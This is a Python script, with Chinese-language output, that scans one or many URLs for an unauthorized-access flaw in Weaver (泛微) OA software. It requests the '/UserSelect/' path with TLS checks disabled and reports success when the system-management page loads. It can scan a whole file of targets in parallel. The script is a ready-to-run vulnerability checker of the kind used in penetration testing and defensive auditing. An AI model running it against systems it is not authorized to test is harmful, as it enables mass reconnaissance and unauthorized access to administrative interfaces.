import re
import time
import argparse
import requests
import multiprocessing
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
   
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'   
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",  
        }
    vuln_url=target_url+"/UserSelect/"
    console.print(now_time() + " [INFO]     正在检测泛微未授权访问漏洞漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        url = requests.get(vuln_url, headers=headers, verify=False)
        if url.status_code== 200 and '系统管理' in url.text:
            console.print(now_time() + ' [SUCCESS]  泛微未授权访问漏洞:{}'.format(vuln_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  泛微未授权访问漏洞漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在', style='bold red')
 
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
